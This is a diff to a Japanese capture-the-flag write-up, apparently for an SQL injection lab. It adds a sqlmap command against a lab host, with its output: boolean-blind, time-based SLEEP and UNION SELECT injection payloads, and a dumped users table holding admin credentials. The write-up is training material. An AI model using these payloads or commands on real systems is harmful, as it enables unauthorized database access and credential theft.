@@ -102,7 +102,41 @@ Table: flag
 ![image](https://user-images.githubusercontent.com/6504854/234930560-452e84c4-385f-4262-98eb-837e6c47d50f.png)
 ![image](https://user-images.githubusercontent.com/6504854/234930659-5a9c4fed-8472-45a9-b520-96a33b6714fd.png)
 
+SQLmapでとれず。
+```
+┌──(kali🦝kali)-[~]
+└─$ sqlmap -dbms mysql -u http://10.10.56.57/user?id=1 -p id --dump --flush-session
+
+----------------- snip ------------------
+
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 9655=9655
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 6365 FROM (SELECT(SLEEP(5)))HOws)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-8134 UNION ALL SELECT CONCAT(0x717a786a71,0x486a4c706e684179424c69766c464b55436e55684b55734c685273484843714e73545a4d75767458,0x71766a6a71),NULL,NULL-- -
+---
+Database: sqhell_4
+Table: users
+[1 entry]
++----+----------+----------+
+| id | password | username |
++----+----------+----------+
+| 1  | password | admin    |
++----+----------+----------+
+```
+usersテーブルは3カラムでflagはない。union selectを元にたぶんFLAGテーブルかフィールドFLAGを含むテーブルがあるのではというあてずっぽうでガチャガチャする。
+
 ![image](https://user-images.githubusercontent.com/6504854/234960030-1ab47f3a-d563-4c3d-8c07-c497bffbce08.png)
+
+この問題が一番難しく、答え見て修正した。
 
 #### 5
 コメントとSleepがきく。
@@ -138,14 +172,6 @@ Parameter: id (GET)
 ---
 Database: sqhell_5
 Table: posts
-[2 entries]
-+----+---------+-------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
-| id | user_id | name        | content                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
-+----+---------+-------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
-| 1  | 1       | First Post  | Lorem ipsum dolor sit amet, consectetur adipiscing elit. In id mollis quam. Quisque quis enim eu velit dapibus dignissim quis id dolor. Sed volutpat, magna ut venenatis egestas, diam velit hendrerit nisl, ac suscipit lacus tortor ut nisi. Vestibulum finibus leo vitae consectetur cursus. Integer ut urna nulla. Ut vulputate imperdiet consequat. Sed et est maximus, porta lectus eget, lacinia ligula. Sed tristique odio id eleifend cursus.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
-| 2  | 1       | Second Post | Etiam sit amet est in lacus ullamcorper luctus. Aliquam erat volutpat. Aliquam diam enim, consequat eget dui nec, congue porta enim. Integer venenatis dignissim erat, non elementum ante tincidunt a. Proin congue faucibus odio, at condimentum nibh hendrerit a. Sed posuere venenatis nisi, et laoreet lectus accumsan nec. Aenean sagittis eget tellus vitae volutpat. Praesent lobortis nulla eget urna aliquam, vel viverra enim pharetra. Nullam ac mauris eu erat dictum varius. Nam nulla ipsum, pretium feugiat luctus vel, condimentum et sapien. Nullam auctor pharetra volutpat. Fusce odio orci, pretium eget ligula sit amet, finibus elementum lectus. Etiam scelerisque imperdiet justo non luctus. Phasellus imperdiet odio venenatis, tempus erat eu, ultrices nisl. Morbi suscipit blandit nunc, nec accumsan elit convallis a. Donec gravida, diam sed elementum auctor, enim magna faucibus dui, a pharetra diam dui sed sapien. |
-+----+---------+-------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
-
 Database: sqhell_5
 Table: flag
 [1 entry]
